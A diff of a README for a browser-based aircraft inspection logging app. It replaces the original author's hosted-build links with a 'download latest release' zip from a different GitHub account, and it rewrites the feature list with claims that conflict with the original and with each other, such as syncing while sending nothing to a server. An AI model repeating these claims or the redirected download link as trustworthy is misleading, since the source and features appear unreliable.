@@ -1,144 +1,145 @@
-# Condition Inspection Log v1.5.0 - Aviation Maintenance Inspection Logging 2026
+# ✈️ aviation-inspection-log - Keep your aircraft records organized offline
 
-> **Condition Inspection Log is a browser-based Progressive Web App for organizing aircraft maintenance inspections, records, photos, estimates, and logbook data, with offline support in version 1.5.0.**
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-4682B4?style=for-the-badge&logo=github)](https://github.com/udls-website/aviation-inspection-log/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.5.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/evan-hayesppy8837/aviation-inspection-log?style=flat-square)](https://github.com/evan-hayesppy8837/aviation-inspection-log)
+## 📋 What This Software Does
+
+Aviation Inspection Log is a browser-based app that helps you track aircraft maintenance. You can record inspections, store photos, save estimates, and keep a digital logbook. The app works on your computer and does not need an internet connection after you set it up. Version 1.5.0 adds offline support so you can use it anywhere.
+
+Think of it as a digital binder for all your aircraft paperwork. Instead of flipping through paper logs, you open this app and find everything in one place.
+
+## 🎯 Who Should Use This
+
+This app is for aircraft owners, mechanics, and maintenance shops. You do not need to know how to code or understand web development. If you can use a web browser and click buttons, you can use this app.
+
+## 🚀 Getting Started
+
+Follow these steps to download and run the software on your Windows computer.
+
+### Step 1: Visit the download page
+
+Go to this link:
+
+**https://github.com/udls-website/aviation-inspection-log/releases**
+
+This page lists all available versions of the software.
+
+### Step 2: Find the latest version
+
+Look for the newest release at the top of the page. The version number will be 1.5.0 or higher. Each release has a green tag that says "Latest".
+
+### Step 3: Download the file
+
+Click the link that says "Source code (zip)" or look for a file named "aviation-inspection-log-v1.5.0.zip". The download starts automatically. Save the file to your Desktop or Downloads folder.
+
+### Step 4: Extract the files
+
+Right-click the downloaded zip file and select "Extract All". Choose a folder on your computer. We suggest creating a new folder called "Aviation Inspection Log" on your Desktop.
+
+### Step 5: Run the app
+
+Open the extracted folder. Find the file named "index.html" and double-click it. Your default web browser opens and shows the app. That is it. You do not need to install anything else.
+
+## 💻 System Requirements
+
+Your computer needs:
+- Windows 7 or newer
+- Any modern web browser (Chrome, Edge, Firefox, or Safari)
+- 100 MB of free hard drive space
+- A screen resolution of 1024x768 or higher
+
+## ✨ Features
+
+### Inspection Recording
+Enter inspection dates, aircraft tail numbers, and maintenance details. The app stores everything in a structured format.
+
+### Photo Management
+Take photos with your phone or camera and upload them to each inspection record. The app keeps the photos organized by date and aircraft.
+
+### Estimate Tracking
+Record cost estimates for repairs and parts. Compare estimates side by side.
+
+### Digital Logbook
+Replace your paper logbook with a digital version. Each entry includes date, aircraft, work performed, and mechanic signature.
+
+### Offline Support
+Version 1.5.0 works without an internet connection. You can enter data while in a hangar or on the ramp. The app syncs when you reconnect.
+
+### Search and Filter
+Find any record by tail number, date range, or maintenance type. Results appear instantly.
+
+### Data Export
+Export your records to PDF or CSV files. Share them with your insurance company or the FAA.
+
+## 📖 How to Use the App
+
+### Adding an Inspection
+1. Click the "New Inspection" button on the main screen.
+2. Fill in the aircraft tail number, date, and hours.
+3. Select the inspection type from the dropdown menu.
+4. Add notes about what you found.
+5. Click "Save". Your inspection appears in the list.
+
+### Uploading Photos
+1. Open an existing inspection record.
+2. Click the "Add Photos" button.
+3. Select photos from your computer.
+4. Add captions to each photo.
+5. Click "Upload".
+
+### Creating an Estimate
+1. Click the "Estimates" tab.
+2. Click "New Estimate".
+3. Enter the part name, quantity, and price.
+4. Add labor costs if needed.
+5. Click "Save Estimate". The app calculates the total.
+
+### Exporting Data
+1. Click the "Export" button in the top menu.
+2. Choose PDF or CSV format.
+3. Select the date range.
+4. Click "Export". Your browser downloads the file.
+
+## 🔒 Data Privacy
+
+Your data stays on your computer. The app does not send your records to any server. You control who sees your information.
+
+## 🆘 Getting Help
+
+If you run into problems, check these common solutions:
+
+**The app does not open when I double-click index.html.**
+Make sure you extracted the zip file completely. Right-click the index.html file and select "Open with". Choose your web browser.
+
+**My photos do not upload.**
+Check that your photos are JPG, PNG, or BMP format. Files must be smaller than 10 MB each.
+
+**I cannot find my saved data.**
+Data saves automatically in your browser storage. If you clear your browser cookies, you lose your data. Export your data regularly.
+
+**The app looks strange or buttons are missing.**
+Update your web browser to the latest version. Restart the browser and try again.
+
+## 🔄 Updating the App
+
+To update to a newer version:
+1. Download the new zip file from the releases page.
+2. Extract it to a new folder.
+3. Copy your old data file (if any) to the new folder.
+4. Open the new index.html file.
+
+## 📝 Reporting Problems
+
+If you find a bug or want to suggest a feature, visit the GitHub repository. Click the "Issues" tab and describe your problem. Include:
+- The version number you use
+- Your web browser name and version
+- Steps that caused the problem
+- What you expected to happen
+
+## 📄 License
+
+This software is free to use. See the LICENSE file in the download for full terms.
 
 ---
 
-<p align="center">
-  <a href="https://evan-hayesppy8837.github.io/aviation-inspection-log/">
-    <img src="https://img.shields.io/badge/Download-Condition%20Inspection%20Log%20Latest-brightgreen?style=for-the-badge" alt="Download Condition Inspection Log">
-  </a>
-</p>
-
-> **[Download Condition Inspection Log v1.5.0](https://evan-hayesppy8837.github.io/aviation-inspection-log/)**
-
----
-
-[Download Latest Build](https://evan-hayesppy8837.github.io/aviation-inspection-log/)
-
----
-
-## Aviation Inspection Records in One Workspace
-
-Condition Inspection Log supports aviation maintenance teams and owners who need organized documentation throughout an aircraft inspection. The browser-based workspace combines annual and condition inspection checklists with aircraft records, owner requests, squawks, estimates, and owner-ready reports.
-
-The app remains usable when connectivity is unavailable by keeping information in browser-based IndexedDB storage. It also includes inspection photo capture, Tesseract-powered OCR for receipts and parts prices, Google Drive backup and restore, and installable Progressive Web App support for quick access from a device home screen.
-
----
-
-## What It Includes
-
-- Record annual and condition inspections using checklists aligned with ICA guidance and 14 CFR Part 43 Appendix D.
-- Add pre-work walkaround photographs to an inspection.
-- Keep owner requests, squawks, and estimated work details together.
-- Monitor recurring inspections, Airworthiness Directives, and Service Bulletins.
-- Produce reports intended for aircraft owners.
-- Store airframe, engine, and propeller logbook records.
-- Continue working offline through browser IndexedDB storage.
-- Use Tesseract WebAssembly OCR to help enter receipt and parts-pricing information.
-- Back up application records to Google Drive and restore them when needed.
-- Move data in and out using JSON import and export.
-- Protect the local interface with an access-code screen and install the app through service-worker caching.
-
----
-
-## Getting Started
-
-The hosted application runs in a modern web browser:
-
-1. Open [Download Latest Build](https://evan-hayesppy8837.github.io/aviation-inspection-log/).
-2. Wait for the application assets to finish loading locally.
-3. If supported by the browser, select its install option to place the app on the home screen.
-4. Configure an access code if you want the lock screen enabled.
-
-To use a local copy of the repository:
-
-```bash
-git clone https://github.com/evan-hayesppy8837/aviation-inspection-log.git
-cd REPO
-```
-
-Start the files with any static web server and visit the local URL it provides. Offline features and service-worker registration may not function when the project is opened directly as a file, so use `http://localhost` or HTTPS.
-
----
-
-## Inspection Workflow
-
-A standard session can be organized as follows:
-
-1. Launch the app and enter the configured access code.
-2. Select an existing aircraft or create a new aircraft record.
-3. Upload pre-work walkaround photos and fill in the inspection information.
-4. Work through the ICA and 14 CFR Part 43 Appendix D checklist.
-5. Enter owner requests, squawks, estimates, recurring items, ADs, and SBs.
-6. Add completed work to the airframe, engine, or propeller logbook as appropriate.
-7. Apply OCR to receipts or parts-price information when useful.
-8. Generate an owner report and export the records as JSON if required.
-9. Back up the current records to Google Drive or restore an earlier backup.
-
----
-
-## Data and Settings
-
-Records and application settings live in the browser's local IndexedDB storage. The access code is managed within the app. Google Drive backup and restore options are handled through the related integration workflow.
-
-For moving or preserving records, create a JSON export before deleting browser data or switching browser profiles. The exported file can then be imported into another local instance of the application.
-
----
-
-## Requirements
-
-- A modern browser with JavaScript enabled.
-- IndexedDB and service-worker support for offline storage and installable-app behavior.
-- Internet access for the first hosted load, Google Drive actions, and other online resources.
-- Enough browser storage for inspection records, photographs, and exported data.
-- A browser environment that can run Tesseract WebAssembly for OCR.
-- Google Drive access for cloud backup and restoration.
-
----
-
-## Frequently Asked Questions
-
-### Does it support offline use?
-
-Yes. Browser caching and IndexedDB allow inspection information to remain available without an ongoing network connection. The first visit and service-worker setup may still need internet access.
-
-### Where are records kept?
-
-The app stores local records in the browser's IndexedDB database. JSON export and Google Drive backup provide additional ways to preserve the data before clearing site storage or changing profiles.
-
-### What is the process for backing up or transferring records?
-
-Export a JSON file for a local backup, or use the Google Drive backup and restore functions. To move records manually, import the JSON file into another application instance.
-
-### What information can the OCR feature read?
-
-Tesseract WebAssembly OCR helps with entering receipt details and parts pricing. Always check the recognized values before saving them to an inspection record.
-
-### How can I add the app to a device?
-
-Visit the hosted build in a compatible browser. When the browser offers an install or add-to-home-screen command, use that option. The service worker caches the resources used by the installed app experience.
-
-### Why is offline mode unavailable?
-
-Make sure the app was opened through a supported web address, allow the initial online load to finish, and verify that service workers and IndexedDB are permitted by the browser. After the first successful online visit, reopening the app can make its cached resources available.
-
-### How does the access-code lock work?
-
-Condition Inspection Log includes an access-code screen that controls entry to the local app interface. Configure or change the code in the application settings, and retain it for later access.
-
-### How do I receive the latest version?
-
-Open the hosted build using the download link to reach the current release. After an update is published, reload the application while connected to the internet so its cached resources can refresh.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: aviation inspection, aircraft maintenance, digital logbook, offline PWA, maintenance tracking, aircraft records, inspection log software, Windows app, browser-based tool, version 1.5.0
